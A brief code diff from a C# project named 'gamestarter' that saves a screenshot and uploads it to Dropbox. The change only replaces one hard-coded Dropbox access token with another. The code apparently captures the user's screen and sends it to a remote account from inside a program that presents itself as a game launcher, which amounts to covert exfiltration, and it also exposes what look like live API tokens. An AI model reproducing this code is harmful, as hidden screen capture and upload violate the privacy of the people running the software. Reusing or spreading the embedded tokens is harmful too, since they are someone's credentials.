@@ -40,7 +40,7 @@ namespace gamestarter
             bitmap.Save(tempFilePath, System.Drawing.Imaging.ImageFormat.Png);
 
             // Upload the screenshot to Dropbox
-            using (var dbx = new DropboxClient("sl.Bw1M76f5hULoelySMdoVW0a6hW-V1A142k7dFq2Edze_gFHMpPij0PN5DYTzuRBVAst92VxNAq57dMwDZt53T4gzS_HDZVG92-pnQ-WmQOYB8551dm8rzlE78_qhppAad7UQii8_lbM3Hf0"))
+            using (var dbx = new DropboxClient("sl.Bw1gfrZfqeKoUshxjCjEwoqCZrbWLOZtqBUUD0K1Pl4Utr1rf5J0s-nMggANjznsSw_sg3wYnTz4ydPy0PhfLgKy7MnKelz0aQgCENwr7ccuemCVaK2QGdH3IruYNBQiTPWSnw9NFvu_8t8"))
             {
                 using (var mem = new MemoryStream(File.ReadAllBytes(tempFilePath)))
                 {
